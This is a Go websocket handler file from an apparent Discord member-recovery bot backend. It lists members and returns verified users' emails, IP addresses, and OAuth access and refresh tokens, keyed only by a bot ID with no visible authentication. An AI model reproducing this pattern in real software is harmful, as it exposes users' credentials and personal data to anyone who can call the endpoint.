package websocket

import (
	"amethys-api/database"
	"amethys-api/services"
	"fmt"
)

type ListMembersRequest struct {
	BotID string `json:"botId"`
}

type CheckAuthCountRequest struct {
	BotID string `json:"botId"`
}

type RecoverMembersRequest struct {
	BotID   string `json:"botId"`
	GuildID string `json:"guildId"`
}

type MembersResponse struct {
	Success bool                   `json:"success"`
	Message string                 `json:"message"`
	Data    map[string]interface{} `json:"data,omitempty"`
}

func HandleListMembers(req ListMembersRequest) MembersResponse {
	if req.BotID == "" {
		return MembersResponse{Success: false, Message: "botId é obrigatório"}
	}

	bot, err := database.DB.FindBotByClientID(req.BotID)
	if err != nil {
		return MembersResponse{Success: false, Message: "Bot não encontrado"}
	}

	if len(bot.Members) == 0 {
		return MembersResponse{
			Success: true,
			Message: "Nenhum membro encontrado para este bot",
			Data: map[string]interface{}{
				"members": []database.Member{},
				"total":   0,
			},
		}
	}

	services.LogWebSocketEvent("list_members", req.BotID, fmt.Sprintf("%d members found", len(bot.Members)))

	return MembersResponse{
		Success: true,
		Message: fmt.Sprintf("%d membros encontrados", len(bot.Members)),
		Data: map[string]interface{}{
			"members": bot.Members,
			"total":   len(bot.Members),
		},
	}
}

func HandleCheckAuthCount(req CheckAuthCountRequest) MembersResponse {
	if req.BotID == "" {
		return MembersResponse{Success: false, Message: "botId é obrigatório"}
	}

	bot, err := database.DB.FindBotByClientID(req.BotID)
	if err != nil {
		return MembersResponse{Success: false, Message: "Bot não encontrado"}
	}

	authCount := len(bot.Members)

	return MembersResponse{
		Success: true,
		Message: fmt.Sprintf("%d membros autenticados encontrados", authCount),
		Data: map[string]interface{}{
			"count":        authCount, // campo esperado pelo bot Python (estava faltando)
			"authCount":    authCount,
			"totalMembers": authCount,
		},
	}
}

func HandleRecoverMembers(req RecoverMembersRequest) MembersResponse {
	if req.BotID == "" {
		return MembersResponse{Success: false, Message: "botId é obrigatório"}
	}

	bot, err := database.DB.FindBotByClientID(req.BotID)
	if err != nil {
		return MembersResponse{Success: false, Message: "Bot não encontrado"}
	}

	if len(bot.Members) == 0 {
		return MembersResponse{
			Success: true,
			Message: "Nenhum membro encontrado para este bot",
			Data: map[string]interface{}{
				"verified_members": []database.Member{},
				"total_verified":   0,
				"total_members":    0,
			},
		}
	}

	verifiedMembers := []map[string]interface{}{}
	for _, member := range bot.Members {
		if member.VerifiedAt != "" {
			verifiedMembers = append(verifiedMembers, map[string]interface{}{
				"id":              member.ID,
				"username":        member.Username,
				"discriminator":   member.Discriminator,
				"email":           member.Email,
				"ip":              member.IP,
				"verified_at":     member.VerifiedAt,
				"access_token":    member.AccessToken,
				"refresh_token":   member.RefreshToken,
				"recovery_status": "pending",
				"recovery_reason": nil,
			})
		}
	}

	services.LogWebSocketEvent(
		"recover_members",
		req.BotID,
		fmt.Sprintf("%d verified members found for recovery", len(verifiedMembers)),
	)

	return MembersResponse{
		Success: true,
		Message: fmt.Sprintf("%d membros verificados encontrados para recuperação", len(verifiedMembers)),
		Data: map[string]interface{}{
			"verified_members": verifiedMembers,
			"total_verified":   len(verifiedMembers),
			"total_members":    len(bot.Members),
			"guild_id":         req.GuildID,
		},
	}
}
